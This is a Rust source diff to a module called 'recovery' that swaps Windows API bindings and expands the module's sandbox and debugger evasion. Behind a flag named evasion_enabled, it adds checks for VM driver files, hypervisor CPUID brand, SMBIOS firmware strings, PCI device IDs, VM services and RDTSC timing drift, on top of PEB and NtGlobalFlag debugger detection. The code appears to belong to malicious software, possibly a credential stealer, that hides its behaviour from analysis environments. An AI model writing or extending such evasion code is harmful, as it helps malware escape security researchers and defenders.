@@ -1,5 +1,6 @@
 use crate::recovery::{
     context::RecoveryContext,
+    settings::RecoveryControl,
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
 use async_trait::async_trait;
@@ -7,14 +8,13 @@ use libloading::Library;
 use rand::{Rng, SeedableRng, rngs::StdRng, seq::SliceRandom};
 use serde::Serialize;
 use std::ffi::c_void;
-use std::mem::MaybeUninit;
 use std::ptr;
 use std::sync::Arc;
 use std::time::Instant;
 use tokio::time::{Duration as TokioDuration, sleep};
-use windows::Win32::System::Memory::{
+use windows_sys::Win32::System::Memory::{
     MEMORY_BASIC_INFORMATION, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
-    PAGE_EXECUTE_WRITECOPY, PAGE_GUARD, PAGE_NOACCESS, PAGE_NOCACHE, PAGE_PROTECTION_FLAGS,
+    PAGE_EXECUTE_WRITECOPY, PAGE_GUARD, PAGE_NOACCESS, PAGE_NOCACHE,
     PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOMBINE, PAGE_WRITECOPY, VirtualQuery,
 };
 
@@ -119,15 +119,14 @@ impl HotPathInspector {
         match self.resolve_symbol(function_name) {
             Ok(ptr) => unsafe {
                 let address = ptr as *const c_void;
-                let mut info = MaybeUninit::<MEMORY_BASIC_INFORMATION>::uninit();
+                let mut info: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
                 let length = std::mem::size_of::<MEMORY_BASIC_INFORMATION>();
-                if VirtualQuery(Some(address), info.as_mut_ptr(), length) == 0 {
+                if VirtualQuery(address, &mut info, length) == 0 {
                     observation.reason = Some(format!(
                         "VirtualQuery failed: {}",
                         std::io::Error::last_os_error()
                     ));
                 } else {
-                    let info = info.assume_init();
                     observation.protection = Some(format_page_protection_label(info.Protect));
                     observation.suspicious = is_page_protection_suspicious(info.Protect);
                     if observation.suspicious && observation.reason.is_none() {
@@ -183,13 +182,17 @@ const HOT_PATH_CHECKSUMS: [HotPathChecksum; 3] = [
 ];
 
 const PAGE_PROTECTION_BASE_MASK: u32 = 0xFF;
-const PAGE_PROTECTION_EXPECTED_BASES: [u32; 2] = [PAGE_EXECUTE.0, PAGE_EXECUTE_READ.0];
+const PAGE_PROTECTION_EXPECTED_BASES: [u32; 2] = [PAGE_EXECUTE, PAGE_EXECUTE_READ];
 
 const SINGLE_STEP_ITERATIONS: usize = 64;
 const SINGLE_STEP_THRESHOLD_CYCLES: u64 = 2_400;
 const SINGLE_STEP_INNER_LOOP: usize = 16;
 
 pub fn behavioral_tasks(_ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
+    let control = RecoveryControl::global();
+    if control.debug_enabled() {
+        return vec![];
+    }
     vec![
         Arc::new(TimingDistortionTask),
         Arc::new(SyscallAnomaliesTask),
@@ -202,6 +205,10 @@ pub fn behavioral_tasks(_ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
 }
 
 pub async fn check_behavioral() -> bool {
+    if !RecoveryControl::global().evasion_enabled() {
+        return true;
+    }
+
     let mut suspicious = false;
 
     let debugger = collect_debugger_summary();
@@ -209,7 +216,6 @@ pub async fn check_behavioral() -> bool {
         suspicious = true;
     }
 
-    // VM/Sandbox
     let env = collect_environmental_summary();
     if env.suspicious {
         suspicious = true;
@@ -269,7 +275,6 @@ fn collect_debugger_summary() -> DebuggerSummary {
     let mut checks = Vec::new();
     let mut suspicious = false;
 
-    // Check PEB BeingDebugged flag
     let peb_debugged = is_peb_debugger_present();
     if peb_debugged {
         suspicious = true;
@@ -280,7 +285,6 @@ fn collect_debugger_summary() -> DebuggerSummary {
         details: None,
     });
 
-    // Check for NtGlobalFlag
     let nt_global_flag = is_nt_global_flag_set();
     if nt_global_flag {
         suspicious = true;
@@ -371,11 +375,15 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
 
     use crate::recovery::helpers::anti_vm;
 
-    // Check for common VM files
     let vm_files = [
         "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
         "C:\\windows\\System32\\Drivers\\vboxguest.sys",
         "C:\\windows\\System32\\Drivers\\vmhgfs.sys",
+        "C:\\windows\\System32\\Drivers\\VBoxMouse.sys",
+        "C:\\windows\\System32\\Drivers\\VBoxSF.sys",
+        "C:\\windows\\System32\\Drivers\\VBoxVideo.sys",
+        "C:\\windows\\System32\\Drivers\\vmsmbus.sys",
+        "C:\\windows\\System32\\Drivers\\vmice.sys",
     ];
 
     for file in vm_files {
@@ -390,7 +398,6 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
         });
     }
 
-    // Check for RAM size (Sandboxes often have < 4GB)
     if let Ok(mem) = get_total_ram_gb() {
         let low_ram = mem < 4;
         if low_ram {
@@ -403,7 +410,6 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
         });
     }
 
-    // CPUID Hypervisor Check
     let cpuid_vm = anti_vm::check_cpuid_hypervisor();
     if cpuid_vm {
         suspicious = true;
@@ -414,7 +420,6 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
         details: None,
     });
 
-    // CPU Cores Check
     let low_cores = anti_vm::check_cpu_cores();
     if low_cores {
         suspicious = true;
@@ -425,7 +430,6 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
         details: None,
     });
 
-    // Screen Resolution Check
     let bad_res = anti_vm::check_screen_resolution();
     if bad_res {
         suspicious = true;
@@ -436,7 +440,6 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
         details: None,
     });
 
-    // Process Enumeration (VM Tools)
     let vm_procs = anti_vm::check_processes();
     if vm_procs {
         suspicious = true;
@@ -447,7 +450,6 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
         details: None,
     });
 
-    // Username/Hostname Blocklist
     let bad_user = anti_vm::check_usernames();
     if bad_user {
         suspicious = true;
@@ -458,7 +460,6 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
         details: None,
     });
 
-    // Disk Size Check
     let small_disk = anti_vm::check_disk_size();
     if small_disk {
         suspicious = true;
@@ -469,7 +470,6 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
         details: None,
     });
 
-    // MAC Address OUI Check
     let bad_mac = anti_vm::check_mac_address();
     if bad_mac {
         suspicious = true;
@@ -480,15 +480,65 @@ fn collect_environmental_summary() -> EnvironmentalSummary {
         details: None,
     });
 
+    let bad_brand = anti_vm::check_hypervisor_brand();
+    if bad_brand {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "CPUID Hypervisor Brand".to_string(),
+        detected: bad_brand,
+        details: None,
+    });
+
+    let bad_firmware = anti_vm::check_firmware();
+    if bad_firmware {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "VM Firmware Strings (SMBIOS)".to_string(),
+        detected: bad_firmware,
+        details: None,
+    });
+
+    let bad_pci = anti_vm::check_pci_devices();
+    if bad_pci {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "VM PCI Device IDs".to_string(),
+        detected: bad_pci,
+        details: None,
+    });
+
+    let bad_services = anti_vm::check_services();
+    if bad_services {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "VM Services".to_string(),
+        detected: bad_services,
+        details: None,
+    });
+
+    let timing_drift = anti_vm::check_timing_drift();
+    if timing_drift {
+        suspicious = true;
+    }
+    checks.push(EnvironmentalCheck {
+        name: "RDTSC Timing Drift (Sandbox)".to_string(),
+        detected: timing_drift,
+        details: None,
+    });
+
     EnvironmentalSummary { suspicious, checks }
 }
 
 fn get_total_ram_gb() -> Result<u64, String> {
-    use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
+    use windows_sys::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
     unsafe {
-        let mut mem_status = MEMORYSTATUSEX::default();
+        let mut mem_status: MEMORYSTATUSEX = std::mem::zeroed();
         mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
-        if GlobalMemoryStatusEx(&mut mem_status).is_ok() {
+        if GlobalMemoryStatusEx(&mut mem_status) != 0 {
             Ok(mem_status.ullTotalPhys / (1024 * 1024 * 1024))
         } else {
             Err("failed to get memory status".to_string())
@@ -856,17 +906,17 @@ fn inspect_page_protections() -> PageProtectionSummary {
     }
 }
 
-fn format_page_protection_label(protection: PAGE_PROTECTION_FLAGS) -> String {
+fn format_page_protection_label(protection: u32) -> String {
     let mut pieces = Vec::new();
-    let base = protection.0 & PAGE_PROTECTION_BASE_MASK;
+    let base = protection & PAGE_PROTECTION_BASE_MASK;
     pieces.push(page_protection_base_label(base));
-    if (protection.0 & PAGE_GUARD.0) != 0 {
+    if (protection & PAGE_GUARD) != 0 {
         pieces.push("PAGE_GUARD".to_string());
     }
-    if (protection.0 & PAGE_NOCACHE.0) != 0 {
+    if (protection & PAGE_NOCACHE) != 0 {
         pieces.push("PAGE_NOCACHE".to_string());
     }
-    if (protection.0 & PAGE_WRITECOMBINE.0) != 0 {
+    if (protection & PAGE_WRITECOMBINE) != 0 {
         pieces.push("PAGE_WRITECOMBINE".to_string());
     }
     pieces.join(" | ")
@@ -874,21 +924,21 @@ fn format_page_protection_label(protection: PAGE_PROTECTION_FLAGS) -> String {
 
 fn page_protection_base_label(base: u32) -> String {
     match base {
-        value if value == PAGE_NOACCESS.0 => "PAGE_NOACCESS".to_string(),
-        value if value == PAGE_READONLY.0 => "PAGE_READONLY".to_string(),
-        value if value == PAGE_READWRITE.0 => "PAGE_READWRITE".to_string(),
-        value if value == PAGE_WRITECOPY.0 => "PAGE_WRITECOPY".to_string(),
-        value if value == PAGE_EXECUTE.0 => "PAGE_EXECUTE".to_string(),
-        value if value == PAGE_EXECUTE_READ.0 => "PAGE_EXECUTE_READ".to_string(),
-        value if value == PAGE_EXECUTE_READWRITE.0 => "PAGE_EXECUTE_READWRITE".to_string(),
-        value if value == PAGE_EXECUTE_WRITECOPY.0 => "PAGE_EXECUTE_WRITECOPY".to_string(),
+        value if value == PAGE_NOACCESS => "PAGE_NOACCESS".to_string(),
+        value if value == PAGE_READONLY => "PAGE_READONLY".to_string(),
+        value if value == PAGE_READWRITE => "PAGE_READWRITE".to_string(),
+        value if value == PAGE_WRITECOPY => "PAGE_WRITECOPY".to_string(),
+        value if value == PAGE_EXECUTE => "PAGE_EXECUTE".to_string(),
+        value if value == PAGE_EXECUTE_READ => "PAGE_EXECUTE_READ".to_string(),
+        value if value == PAGE_EXECUTE_READWRITE => "PAGE_EXECUTE_READWRITE".to_string(),
+        value if value == PAGE_EXECUTE_WRITECOPY => "PAGE_EXECUTE_WRITECOPY".to_string(),
         other => format!("PAGE_UNKNOWN(0x{other:02X})"),
     }
 }
 
-fn is_page_protection_suspicious(protection: PAGE_PROTECTION_FLAGS) -> bool {
-    let base = protection.0 & PAGE_PROTECTION_BASE_MASK;
-    if (protection.0 & PAGE_GUARD.0) != 0 || (protection.0 & PAGE_NOACCESS.0) != 0 {
+fn is_page_protection_suspicious(protection: u32) -> bool {
+    let base = protection & PAGE_PROTECTION_BASE_MASK;
+    if (protection & PAGE_GUARD) != 0 || (protection & PAGE_NOACCESS) != 0 {
         return true;
     }
     !PAGE_PROTECTION_EXPECTED_BASES.contains(&base)
